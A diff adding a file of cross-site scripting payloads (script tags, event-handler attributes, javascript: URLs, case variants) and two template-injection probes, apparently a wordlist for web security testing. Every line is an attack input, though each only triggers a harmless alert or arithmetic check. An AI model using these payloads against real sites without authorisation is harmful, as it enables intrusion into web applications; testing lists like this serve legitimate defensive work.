@@ -1,0 +1,16 @@
+<script>alert(1)</script>
+"><script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+javascript:alert(1)
+<body onload=alert(1)>
+'"><script>alert(document.domain)</script>
+<ScRiPt>alert(1)</ScRiPt>
+<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+"><img src=x onerror=alert(1)>
+<iframe src="javascript:alert(1)"></iframe>
+<input type="text" value="<script>alert(1)</script>">
+<div onmouseover="alert(1)">test</div>
+<a href="javascript:alert(1)">click</a>
+{{7*7}}
+${7*7}
